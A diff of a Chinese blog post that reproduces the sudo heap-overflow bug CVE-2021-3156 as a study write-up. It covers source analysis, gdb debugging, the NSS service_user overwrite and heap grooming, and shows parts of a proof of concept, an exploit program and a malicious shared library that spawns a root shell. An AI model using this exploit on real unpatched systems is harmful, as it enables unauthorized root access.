@@ -224,7 +224,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -361,13 +361,15 @@
     <div class="post-body" itemprop="articleBody">
         <p>CVE-2021-3156 sudo 提权漏洞，复现过程总结</p>
 <span id="more"></span>
-
-<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul>
+<h2 id="复现环境">复现环境</h2>
+<ul>
 <li>系统：Ubuntu 20.04</li>
 <li>sudo: sudo-1.8.31</li>
 </ul>
 <p>源码下载：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://mirrors.ustc.edu.cn/ubuntu/pool/main/s/sudo/sudo_1.8.31.orig.tar.gz">https://mirrors.ustc.edu.cn/ubuntu/pool/main/s/sudo/sudo_1.8.31.orig.tar.gz</a></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以参照一下官方的修复方式：<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8">https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8</a></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>可以参照一下官方的修复方式：<br>
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8">https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8</a></p>
 <p>找到 1.8.31 版本源码的漏洞位置如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//plugins/sudoers/sudoers.c</span>
 <span class="token comment">//set_cmnd()</span>
@@ -408,7 +410,6 @@
    <span class="token number">873</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> 
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>在 set_cmnd 函数，看到 866 行处，以 <code>\</code> 开头下一个字符不是空格，那么就认为是转义字符，<code>from++</code> 跳过字符 <code>\</code>，但是没有考虑到下一个字符是 <code>\0</code> 的情况，如果下一个字符是 <code>\0</code>，那么 <code>*to = *from++</code> 就写入 <code>\0</code> 字符，下一次循环条件判断成立，则继续往 user_args 里面写入数据，而 user_args 是在 852-854 行处使用 malloc 分配的一个堆块，这就可以造成一个堆溢出的漏洞</p>
 <p><strong>最后一个参数后面就是环境变量的位置，所以只要最后一个参数以一个 <code>\</code> 结尾，那么就可以通过控制环境变量，堆溢出写入任意数据</strong></p>
 <p>同时看到 819 行处，触发漏洞需要设置 <code>MODE_RUN</code>，<code>MODE_EDIT</code>，<code>MODE_CHECK</code> 中的一个，858 行处，要求设置 <code>MODE_SHELL</code> 或 <code>MODE_LOGIN_SHELL</code></p>
@@ -450,9 +451,6 @@
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <p>在处理命令行参数的时候，设置了 <code>MODE_RUN</code> 和 <code>MODE_SHELL</code> 的情况下，会对命令行参数进行重写，把所有元字符包括 <code>\</code> 都转义了，也就是单个反斜杠变成了两个反斜杠，导致后面的漏洞无法触发</p>
 <p>总结一下：</p>
 <ol>
@@ -486,7 +484,6 @@
    <span class="token number">463</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>MODE_CHECK</code> 在这里设置，使用 <code>-l</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
 
@@ -507,7 +504,6 @@
    <span class="token number">519</span>          mode <span class="token operator">=</span> MODE_CHECK<span class="token punctuation">;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>那么有以下几种选择：</p>
 <ol>
 <li><code>-s -e</code></li>
@@ -529,7 +525,6 @@
    <span class="token number">533</span>          <span class="token function">usage</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>查看源码还发现一处地方：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
 
@@ -541,11 +536,13 @@
    <span class="token number">272</span>      <span class="token punctuation">&#125;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>当程序的名字是 sudoedit 时，会设置 <code>MODE_EDIT</code>，而不会去修改 <code>valid_flags</code>，那么就可以达成漏洞利用的条件，这就是 poc 和目前已公开的 exp 都使用 sudoedit 而不适用 sudo 的原因</p>
 <p>那么只需要用 <code>sudoedit -s xxx</code>，就可以设置 <code>MODE_EDIT</code> 和 <code>MODE_SHELL</code>，而不设置 <code>MODE_RUN</code> 了</p>
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="调试前准备"><a href="#调试前准备" class="headerlink" title="调试前准备"></a>调试前准备</h3><p>使用源码编译的程序进行调试，编译后创建一个链接 sudoedit 到 sudo，或者改名 sudo 为 sudoedit（ubuntu 中的 sudoedit 其实是 sudo 的一个软链接），权限改为 root，并加上 sid 权限</p>
-<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>为了更好操控 sudo 程序的环境变量，采用 execve 函数来执行 sudoedit，这里写一个 poc.c:</p>
+<h2 id="调试分析">调试分析</h2>
+<h3 id="调试前准备">调试前准备</h3>
+<p>使用源码编译的程序进行调试，编译后创建一个链接 sudoedit 到 sudo，或者改名 sudo 为 sudoedit（ubuntu 中的 sudoedit 其实是 sudo 的一个软链接），权限改为 root，并加上 sid 权限</p>
+<h3 id="poc">poc</h3>
+<p>为了更好操控 sudo 程序的环境变量，采用 execve 函数来执行 sudoedit，这里写一个 poc.c:</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//poc.c</span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
@@ -573,8 +570,8 @@
 
         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="调试开始"><a href="#调试开始" class="headerlink" title="调试开始"></a>调试开始</h3><p>使用 <code>sudo gdb ./poc</code>，执行 <code>catch exec</code> 跟踪 execve，<code>r</code> 命令运行</p>
+<h3 id="调试开始">调试开始</h3>
+<p>使用 <code>sudo gdb ./poc</code>，执行 <code>catch exec</code> 跟踪 execve，<code>r</code> 命令运行</p>
 <p>setlocale 是 sudo 程序开头调用的函数，在这下断点，断下后 <code>finish</code> 即可进入 sudo 的 main 函数</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-1.png" alt="entry"></p>
 <p>要注意的是，进入 main 函数后，最好删除 setlocale 的断点，以免后续的调用影响跟踪调试</p>
@@ -585,8 +582,7 @@
 <span class="token number">214</span>             <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"fatal error, unable to load plugins"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>n</code> 命令步过，加载完 sudoers.so 库后，使用命令 <code>b set_cmnd</code> 在 set_cmnd 函数下断点，<code>c</code> 继续运行，来到断点处，并在 854 行下断点，继续运行</p>
+<p><code>n</code> 命令步过，加载完 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://sudoers.so">sudoers.so</a> 库后，使用命令 <code>b set_cmnd</code> 在 set_cmnd 函数下断点，<code>c</code> 继续运行，来到断点处，并在 854 行下断点，继续运行</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token number">854</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token number">855</span>                     <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -594,9 +590,9 @@
 <span class="token number">857</span>                 <span class="token punctuation">&#125;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>user_args 的大小为 0x10002 即 65538 （<code>&quot;\\&quot; + &quot;A&quot; * 65535 + 2</code>），并记录 user_args 的 chunk 地址为 <code>0x55555558faa0</code></p>
-<p><img src="/images/CVE-2021-3156/CVE-2021-3156-2.png" alt="user_args_size"><br><img src="/images/CVE-2021-3156/CVE-2021-3156-3.png" alt="user_args"></p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-2.png" alt="user_args_size"><br>
+<img src="/images/CVE-2021-3156/CVE-2021-3156-3.png" alt="user_args"></p>
 <p>跟踪来到漏洞点处：</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-4.png" alt="user_args"></p>
 <p>来到 870 处：</p>
@@ -605,14 +601,16 @@
 <p>但是，for 循环继续运行，<code>&quot;A&quot; * 65535</code> 又开始继续往后覆盖，此时溢出就出现了</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-6.png" alt="overwrite"></p>
 <p>可以看到，溢出把下一个 chunk 的 size 字段都改了，后面 malloc 的时候触发 abort，导致程序异常退出了</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此时可以知道几点：</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>此时可以知道几点：</p>
 <ol>
 <li>user_args 的大小可以由命令行参数控制</li>
 <li>命令行参数中出现单个反斜杠字符结尾，则会导致堆溢出</li>
 <li>若单个反斜杠结尾出现在最后一个命令行参数，那么溢出的内容就是紧接着的环境变量，完全可控</li>
 <li>单个反斜杠结尾的命令行参数或者环境变量都能往 chunk 写入 <code>\0</code></li>
 </ol>
-<h3 id="NSS（Name-Service-Switch）"><a href="#NSS（Name-Service-Switch）" class="headerlink" title="NSS（Name Service Switch）"></a>NSS（Name Service Switch）</h3><p>目前公开的 exp 大都利用了 NSS（Name Service Switch）机制，这里简述 NSS 的机制</p>
+<h3 id="NSS（Name-Service-Switch）">NSS（Name Service Switch）</h3>
+<p>目前公开的 exp 大都利用了 NSS（Name Service Switch）机制，这里简述 NSS 的机制</p>
 <p>首先是根据 <code>/etc/nsswitch.conf</code> 内容（例如下面这个），初始化链式的 name_database_entry 结构体</p>
 <pre class="line-numbers language-none"><code class="language-none"># &#x2F;etc&#x2F;nsswitch.conf
 #
@@ -634,7 +632,6 @@ ethers:         db files
 rpc:            db files
 
 netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>name_database_entry 结构体定义如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span>
 <span class="token punctuation">&#123;</span>
@@ -645,7 +642,6 @@ netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></sp
   <span class="token comment">/* Name of the database.  */</span>
   <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span> name_database_entry<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>name</code> 字段就是 <code>group</code>，<code>shadow</code> 这些字符串，然后以 <code>next</code> 字段链接起来形成链表</p>
 <p>后面的 <code>files systemd</code> 是 service_user 结构体的 <code>name</code> 字段，定义如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">service_user</span>
@@ -661,7 +657,6 @@ netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></sp
   <span class="token comment">/* Name of the service (`files', `dns', `nis', ...).  */</span>
   <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span> service_user<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>需要使用服务的时候，如果库未加载，则会调用 <code>nss_load_library</code> 函数加载动态链接库</p>
 <p>在 set_cmnd 函数结束后，sudoers_lookup 会调用 <code>nss_load_library</code> 函数，源码如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//glibc/nss/nsswitch.c</span>
@@ -729,7 +724,6 @@ netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></sp
     <span class="token punctuation">&#125;</span>
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>最主要的是，当 <code>ni-&gt;library-&gt;lib_handle == NULL</code> 成立后，会执行 <code>dlopen</code> 加载动态链接库：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
       <span class="token keyword">char</span> shlib_name<span class="token punctuation">[</span>shlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -742,9 +736,8 @@ netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></sp
       ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>前面有 <code>ni-&gt;library == NULL</code> 时执行 <code>nss_new_service</code> 返回的 <code>library-&gt;lib_handle</code> 就是 NULL</p>
-<p>且 service_user 结构体刚好在堆上，只要溢出覆盖一个 service_user 结构体，伪造 <code>name</code> 字段为 <code>X/X</code>，<code>library</code> 字段为 NULL，那么后续调用 <code>nss_load_library</code> 时就会调用 <code>__libc_dlopen(&quot;libnss_X/X.so.xx&quot;)</code> 加载自己写的动态链接库 </p>
+<p>且 service_user 结构体刚好在堆上，只要溢出覆盖一个 service_user 结构体，伪造 <code>name</code> 字段为 <code>X/X</code>，<code>library</code> 字段为 NULL，那么后续调用 <code>nss_load_library</code> 时就会调用 <code>__libc_dlopen(&quot;libnss_X/X.so.xx&quot;)</code> 加载自己写的动态链接库</p>
 <p>只要动态链接库写个 constructor 函数，执行 shell，即可提权</p>
 <p>这里有一点，大部分文章都没提到（也可能是默认大家都知道了）：<strong>为什么一定要覆盖 <code>name</code> 成 <code>X/X</code> 的形式，而不是 <code>X</code> 的形式？</strong></p>
 <p>这可以从 dlopen 的 man 手册中找到答案：</p>
@@ -754,9 +747,9 @@ netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></sp
        (see ld.so(8) for further details):
 
 ......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>大概意思是，filename 参数只有存在 <code>/</code> 的时候，才会有可能被当作相对路径，没有 <code>/</code> 的时候，会去 PATH 等环境变量指向的地方找对应的库文件，为了方便，使用相对路径的方式，所以使用 <code>X/X</code> 的形式</p>
-<h3 id="service-user-结构体分布"><a href="#service-user-结构体分布" class="headerlink" title="service_user 结构体分布"></a>service_user 结构体分布</h3><p>gdb 上使用 <code>search -s systemd</code> 可以找到 service_user 等结构体</p>
+<h3 id="service-user-结构体分布">service_user 结构体分布</h3>
+<p>gdb 上使用 <code>search -s systemd</code> 可以找到 service_user 等结构体</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-7.png" alt="service_user"></p>
 <p>可以看到 passwd 的 name_database_entry，的 <code>service</code> 字段指向了一条链表，链表上是 <code>files</code> -&gt; <code>systemd</code> 的 service_user 结构体</p>
 <p>那么只要覆盖这两个 service_user 中的一个就可以了，覆盖后面的 service_user 可能会同时把前面的 service_user 也覆盖了，破坏了链表就不行了，所以选择覆盖前面的那个 service_user，同时不能把前面的 name_database_entry 结构体也破坏了</p>
@@ -768,11 +761,12 @@ group(name_database_entry)
 files(service_user)
 systemd(service_user)
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>只要 user_args 位于 name_database_entry 和 service_user 之间，即可覆盖 service_user 而不会破坏 name_database_entry 了</p>
-<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><p>通过调试发现，在我的复现环境下，一般情况下 user_args 都位于 service_user 之后，根据目前公开的方式，利用程序开头的 setlocale 函数，对 <code>LC_MESSAGES</code>，<code>LC_ALL</code> 等环境变量，都会有多次的堆块分配与释放，影响堆块布局的情况，使得 user_args 分配时，得到的刚好是 setlocale 中 free 进 tcache 的 chunk，因为 setlocale 函数的调用在 service_user 等结构体分配之前，那么 user_args 就能分布在 service_user 结构体之前</p>
+<h3 id="堆布局">堆布局</h3>
+<p>通过调试发现，在我的复现环境下，一般情况下 user_args 都位于 service_user 之后，根据目前公开的方式，利用程序开头的 setlocale 函数，对 <code>LC_MESSAGES</code>，<code>LC_ALL</code> 等环境变量，都会有多次的堆块分配与释放，影响堆块布局的情况，使得 user_args 分配时，得到的刚好是 setlocale 中 free 进 tcache 的 chunk，因为 setlocale 函数的调用在 service_user 等结构体分配之前，那么 user_args 就能分布在 service_user 结构体之前</p>
 <p>比如，环境变量使用 <code>LC_ALL=C.UTF-8@AAAA</code>，<code>@</code> 字符后面的 <code>AAAA</code> 将会在 setlocale 里分配 chunk 进行存储，之后会释放</p>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>经过多次测试，exp 如下，下面使用这个 exp 进行一下调试，说明为什么要这么写：</p>
+<h3 id="调试">调试</h3>
+<p>经过多次测试，exp 如下，下面使用这个 exp 进行一下调试，说明为什么要这么写：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//exp.c</span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
@@ -824,7 +818,6 @@ systemd(service_user)
 
         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>首先看到这里</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
         <span class="token keyword">char</span> <span class="token operator">*</span>LC1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -832,7 +825,6 @@ systemd(service_user)
         <span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>调试来到 user_args 分配前，查看 heap 情况，存储 0xc0 个 <code>X</code> 的 chunk 在这里：</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-8.png" alt="heap"></p>
 <p>同时也可以看到，这个 chunk 的大小并不是 0xc0，而是比 0xc0 要大得多的 0x1a0，和参考的一些文章的说法不太一样</p>
@@ -845,8 +837,6 @@ systemd(service_user)
         <span class="token function">memset</span><span class="token punctuation">(</span>paddingA<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         paddingA<span class="token punctuation">[</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 <p>溢出点到要覆盖 service_user 的偏移为 +0xb10：</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-10.png" alt="len"></p>
 <p>命令行参数本身有 0x190-1 长的数据复制进了 to，那么只需要连续 <code>0xb10 - 0x190 + 1</code> 多的反斜杠即可连续写入 <code>\0</code>，直到目标 service_user 结构体，再继续覆写 0x30 长度的数据，即可到达 <code>name</code> 字段，这就是对下面这部分代码的解释：</p>
@@ -864,8 +854,6 @@ systemd(service_user)
         envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"AAA"</span><span class="token punctuation">;</span>
    
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 <p>这里覆盖 <code>name</code> 为 <code>x/xi4oyu</code>，那么需要编译一个动态链接库 <code>libnss_x/xi4oyu.so.2</code> ，代码如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//mkdir libnss_x &amp;&amp; gcc -fPIC -shared -o 'libnss_x/i4oyu.so.2' xi4oyu.c</span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
@@ -886,18 +874,18 @@ systemd(service_user)
         <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"PATH=/bin:/usr/bin:/sbin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
         <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 <p>利用成功！</p>
 <p><img src="/images/CVE-2021-3156/CVE-2021-3156-11.png" alt="pwn"></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>堆布局的方式比较复杂，其中这一句：</p>
+<h3 id="小结">小结</h3>
+<p>堆布局的方式比较复杂，其中这一句：</p>
